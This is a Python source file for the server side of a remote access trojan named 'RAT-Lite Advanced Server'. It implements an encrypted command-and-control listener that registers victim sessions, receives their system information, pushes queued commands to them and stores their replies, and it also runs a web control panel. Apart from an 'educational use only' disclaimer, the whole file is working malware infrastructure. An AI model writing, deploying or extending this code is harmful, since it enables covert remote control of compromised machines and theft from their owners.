#!/usr/bin/env python3
"""
RAT-Lite Advanced Server
Asyncio-based C2 server with encryption
Educational use only - Authorized testing only
"""

import asyncio
import json
import base64
import logging
from datetime import datetime
from pathlib import Path

from crypto_manager import CryptoManager
from session_manager import SessionManager
from command_handler import CommandHandler
from web_panel import WebPanel

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)-8s | %(message)s',
    handlers=[
        logging.FileHandler('server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class C2Server:
    def __init__(self, host='0.0.0.0', port=8443, web_port=8080):
        self.host = host
        self.port = port
        self.web_port = web_port
        self.crypto = CryptoManager()
        self.sessions = SessionManager()
        self.commands = CommandHandler()
        self.web = WebPanel(self.sessions, self.commands, web_port)
        
    async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        addr = writer.get_extra_info('peername')
        session_id = self.sessions.create_session(addr, writer, reader)
        logger.info(f"[+] New session: {session_id} from {addr}")
        
        try:
            # Key exchange
            await self._key_exchange(session_id, writer, reader)
            
            # Receive system info
            sys_info = await self._receive_encrypted(session_id, reader)
            self.sessions.update_info(session_id, json.loads(sys_info))
            logger.info(f"[*] Session {session_id} info received")
            
            # Main loop
            while True:
                # Check for pending commands
                cmd = await self.sessions.get_command(session_id)
                if cmd:
                    await self._send_encrypted(session_id, writer, cmd)
                    
                    if cmd.get('type') == 'exit':
                        break
                    
                    # Receive response
                    response = await self._receive_encrypted(session_id, reader)
                    self.sessions.store_response(session_id, cmd['id'], response)
                    
                await asyncio.sleep(0.1)
                
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"[-] Session {session_id} error: {e}")
        finally:
            self.sessions.close_session(session_id)
            writer.close()
            await writer.wait_closed()
            logger.info(f"[-] Session {session_id} closed")
    
    async def _key_exchange(self, session_id, writer, reader):
        """RSA key exchange for session key"""
        # Send server public key
        pub_key = self.crypto.get_public_key_pem()
        writer.write(len(pub_key).to_bytes(4, 'big') + pub_key)
        await writer.drain()
        
        # Receive encrypted session key
        key_len = int.from_bytes(await reader.read(4), 'big')
        encrypted_key = await reader.read(key_len)
        session_key = self.crypto.decrypt_rsa(encrypted_key)
        
        self.sessions.set_key(session_id, session_key)
        logger.debug(f"[*] Key exchange complete for {session_id}")
    
    async def _send_encrypted(self, session_id, writer, data):
        """Send AES encrypted data"""
        key = self.sessions.get_key(session_id)
        encrypted = self.crypto.encrypt_aes(json.dumps(data).encode(), key)
        
        writer.write(len(encrypted).to_bytes(4, 'big') + encrypted)
        await writer.drain()
    
    async def _receive_encrypted(self, session_id, reader):
        """Receive and decrypt AES data"""
        key = self.sessions.get_key(session_id)
        data_len = int.from_bytes(await reader.read(4), 'big')
        encrypted = await reader.read(data_len)
        
        decrypted = self.crypto.decrypt_aes(encrypted, key)
        return decrypted.decode()
    
    async def start(self):
        server = await asyncio.start_server(
            self.handle_client, self.host, self.port
        )
        
        logger.info(f"[*] C2 Server listening on {self.host}:{self.port}")
        logger.info(f"[*] Web panel on http://{self.host}:{self.web_port}")
        
        # Start web panel
        web_task = asyncio.create_task(self.web.start())
        
        async with server:
            await server.serve_forever()


if __name__ == '__main__':
    server = C2Server()
    try:
        asyncio.run(server.start())
    except KeyboardInterrupt:
        logger.info("[*] Server shutting down...")